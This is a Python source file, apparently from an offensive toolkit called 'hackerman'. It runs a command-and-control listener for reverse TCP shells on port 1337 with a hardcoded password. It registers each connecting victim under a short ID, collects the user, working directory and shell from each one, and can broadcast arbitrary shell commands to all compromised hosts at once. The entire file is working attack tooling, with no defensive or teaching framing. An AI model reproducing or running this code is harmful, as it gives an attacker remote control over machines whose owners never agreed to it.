from hackerman.handlers import reverse_tcp
from hackerman.ui import shell
from hackerman import utils
import _thread, time, code

quitsig = False

class Server(object):
	def __init__(self, port, password):
		self.port = port
		self.password = password
		self.clients = {}
	def listen(self):
		client = reverse_tcp.Handler(self.port, self.password)
		name = utils.b64e(utils.uid().encode())
		if name[:4] in self.clients:
			name = name[:6]
		else:
			name = name[:4]
		if name in self.clients:
			raise RuntimeError("Too many clients")
		self.clients[name] = client

	def getclientinfo(self, name):
		if not name in self.clients:
			return None
		cli = self.clients[name]

		usr = cli.sh("whoami").decode().strip()
		wdir = cli.sh("pwd").decode().strip()
		shell = cli.sh("echo $SHELL").decode().strip()
		return {'user':usr, 'dir':wdir, 'shell':shell}

	def broadcast_sh(self, cmd):
		res = {}
		for name in self.clients:
			res[name] = self.clients[name].sh(cmd)
		return res

def listen_th(srv):
	while not quitsig:
		srv.listen()

srv = Server(1337, "lamepassword") # debugging version
_thread.start_new_thread(listen_th, (srv, ))